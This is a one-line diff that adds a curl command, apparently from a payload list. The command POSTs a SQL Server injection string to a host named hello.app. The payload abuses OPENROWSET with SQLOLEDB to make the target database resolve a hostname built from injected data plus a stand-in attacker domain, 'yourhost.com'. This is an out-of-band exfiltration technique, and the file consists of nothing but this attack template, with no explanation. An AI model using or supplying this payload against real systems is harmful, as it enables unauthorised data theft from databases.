@@ -1,0 +1,1 @@
+ curl -X POST http://hello.app:4080 -d "SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')
